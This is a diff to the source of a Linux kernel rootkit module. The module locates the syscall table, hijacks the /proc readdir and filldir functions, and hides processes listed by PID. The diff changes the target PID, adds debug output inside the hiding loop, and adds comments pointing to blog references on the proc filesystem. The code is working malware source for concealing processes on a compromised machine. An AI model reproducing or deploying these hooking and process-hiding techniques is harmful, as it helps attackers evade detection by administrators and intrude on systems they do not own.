@@ -10,7 +10,7 @@
 #include <linux/init.h>
 
 #define TMPSZ 150
-#define MY_PID 1632
+#define MY_PID 2387
 
 static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
 static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
@@ -161,12 +161,22 @@ static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t of
     pid = simple_strtol(name, &endp, 10);
 
     list_for_each_entry ( hp, &hidden_procs, list )
+	{
+		#if __DEBUG__
+		printk("hp->pid: %0x\tpid: %0x\n", hp->pid, (unsigned int)pid);
+		#endif
         if ( pid == hp->pid )
             return 0;
+	}
+	
+		
 
     return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
+/*
+*struct file: http://blog.csdn.net/wangchaoxjtuse/article/details/6036684
+*/
 int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
 {
     int ret;
@@ -203,7 +213,7 @@ void unhide_proc ( unsigned short pid )
     {
         if ( pid == hp->pid )
         {
-            list_del(&hp->list);
+	    list_del(&hp->list);
             kfree(hp);
             break;
         }
@@ -226,7 +236,10 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     printk("sys_call_table obtained at %p\n", sys_call_table);
     #endif
 
-    /* Hook /proc for hiding processes */
+    /* 
+	* proc 文件系统参考：http://blog.csdn.net/zhoujian19880205/article/details/7425724
+	*Hook /proc for hiding processes
+	*/
     o_proc_readdir = get_vfs_readdir("/proc");
     hijack_start(o_proc_readdir, &n_proc_readdir);
 
@@ -252,5 +265,6 @@ module_init(i_solemnly_swear_that_i_am_up_to_no_good);
 module_exit(mischief_managed);
 
 MODULE_LICENSE("GPL");
+
 
 
